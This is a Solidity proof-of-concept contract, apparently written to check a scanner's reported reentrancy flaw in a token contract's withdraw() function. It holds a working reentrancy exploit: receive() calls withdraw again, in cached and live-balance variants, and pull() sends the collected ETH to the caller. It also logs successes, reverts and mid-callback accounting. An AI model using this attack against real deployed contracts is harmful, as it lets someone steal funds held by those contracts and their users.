// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface ISTE {
    function withdraw(uint256 tokens) external;
    function balanceOf(address a) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalWithdrawals() external view returns (uint256);
}

/// @dev Executes the scanner's stated payload against STE.withdraw():
///      "When ETH arrives, the attacker's receive() calls withdraw again
///       before the balance is set to 0."
///
/// Two variants, because they are not equivalent:
///   attackCached -> re-enters with the token amount cached BEFORE the call
///                   (the real drain shape; depends on the balance being un-debited)
///   attackLive   -> re-enters with balanceOf() as observed inside the callback
///
/// It also records totalWithdrawals seen inside the callback, which proves whether
/// effects were applied before the interaction (CEI).
contract ReentrantAttacker {
    ISTE public immutable ste;

    uint256 public depth;
    uint256 public attempts;
    uint256 public successes;
    uint256 public reverted;
    uint256 public totalReceived;
    uint256 public cachedTokens;
    uint256 public withdrawalsSeenInsideCallback;
    bytes4 public lastRevertSelector;

    bool private _in;
    bool private _useCached;

    constructor(address target) {
        ste = ISTE(target);
    }

    function attackCached(uint256 reenterDepth) external payable {
        _start(msg.value, reenterDepth, true);
    }

    function attackLive(uint256 reenterDepth) external payable {
        _start(msg.value, reenterDepth, false);
    }

    function _start(uint256 depositWei, uint256 reenterDepth, bool useCached) internal {
        depth = reenterDepth;
        attempts = 0;
        successes = 0;
        reverted = 0;
        totalReceived = 0;
        withdrawalsSeenInsideCallback = type(uint256).max;
        _useCached = useCached;

        (bool ok, ) = payable(address(ste)).call{value: depositWei}("");
        require(ok, "deposit failed");

        uint256 t = ste.balanceOf(address(this));
        cachedTokens = t;
        _in = true;
        ste.withdraw(t);
        _in = false;
    }

    function tokens() external view returns (uint256) { return ste.balanceOf(address(this)); }
    function steBalance() external view returns (uint256) { return address(ste).balance; }

    function pull() external {
        (bool ok, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(ok, "pull failed");
    }

    receive() external payable {
        totalReceived += msg.value;
        if (!_in) return;
        // Snapshot what the contract's own accounting looks like mid-withdrawal.
        if (withdrawalsSeenInsideCallback == type(uint256).max) {
            withdrawalsSeenInsideCallback = ste.totalWithdrawals();
        }
        if (depth == 0) return;
        depth -= 1;
        attempts += 1;

        uint256 amount = _useCached ? cachedTokens : ste.balanceOf(address(this));
        try ste.withdraw(amount) {
            successes += 1;
        } catch (bytes memory reason) {
            reverted += 1;
            if (reason.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(reason, 32)) }
                lastRevertSelector = sel;
            }
        }
    }
}
